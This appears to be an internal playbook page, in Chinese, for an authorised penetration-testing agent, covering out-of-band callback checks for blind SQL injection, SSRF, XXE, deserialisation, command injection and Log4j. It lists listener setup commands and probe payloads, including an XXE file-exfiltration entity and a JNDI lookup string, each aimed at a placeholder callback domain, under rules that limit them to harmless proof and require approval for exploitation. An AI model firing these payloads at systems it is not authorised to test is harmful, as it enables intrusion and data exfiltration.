---
id: oob-interactsh
title: OOB 回连双通道手册（盲注/SSRF/XXE 无回显验证）
tags: oob,回连,interactsh,dnslog,盲注,s4,s5
---
# OOB 回连双通道（宪法「深度测试纪律」第 5 条依赖，先查我）

> 原则：**优先本机反链（交互不出第三方），本机自检失败才切公网平台兜底**；只做存在性证明，公网通道不投递敏感 payload。通道切换必须留痕（record_timeline）。

## 一、通道自检（每项目开工必做，project-warmup 联动）

```bash
# ① 本机通道：interactsh-client（Kali 自带）起本地客户端
interactsh-client -n 1 -sf /tmp/oob_token >/tmp/oob.log 2>&1 &   # 记录分配的域名 *.oob.<随机>.site
# ② 自建接收器兜底（无外联环境）：容器内起 DNS/HTTP 双协议记录器
python3 -m http.server 8899 --bind 0.0.0.0 &        # HTTP 回连：日志即证据
nc -lvnp 53 >/tmp/dns_raw.log 2>&1 &                # 原始 DNS 记录（无域名时用 IP 回连）
# ③ 自检：curl http://<本机回连地址>/probe-ok 落日志即通
```

- 通道优先级：本机 interactsh（有域名）→ 自建 HTTP/NC 记录器（纯 IP 场景，如内网隔离环境）→ 公网 dnslog.cn/interact.sh（兜底，仅无害探针）。
- 每次回连**截图/落日志**到 `evidence/oob/`，回连域名与请求一一对应编号（EV-x）。

## 二、按漏洞类的回连载荷（无害判据）

| 漏洞类 | 探针 | 命中判据 |
|---|---|---|
| SQLi 盲注（MSSQL/Oracle） | `EXEC master..xp_dirtree '\\<回连域>\a'` / UTL_INADDR | DNS 回连记录 |
| Java 反序列化 | ysoserial `URLDNS http://<回连域>/shiro` | DNS 解析记录（不执行命令） |
| XXE | 外部实体 `<!ENTITY x SYSTEM 'http://<回连域>/xxe'>` | HTTP 回连 + 参数实体外带文件内容（只读公开文件） |
| SSRF | `url=http://<回连域>/ssrf` | 回连源 IP 即目标出网证明 |
| 命令注入盲注 | `curl http://<回连域>/cmdi` / `ping -c1 <回连域>` | HTTP/DNS 双通道任一 |
| Log4j2 | `${jndi:ldap://<回连域>/log4j}` | LDAP/DNS 回连（禁投递恶意 LDAP 服务器载荷，转 S5） |
| 路径穿越 → 远端包含 | `http://<回连域>/rfi.txt` | 回连证明可外联 |

## 三、纪律

- 回连域名按 `漏洞类-目标ID-序号` 命名，证据可回溯到具体测试项。
- 命中后 update_coverage（vulnerable/needs_follow_up + 回连证据路径）；利用级动作转 S5 审批。
- 公网通道记录**不携带**目标敏感数据（只回连不外带文件内容；XXE 外带仅限公开示例文件）。
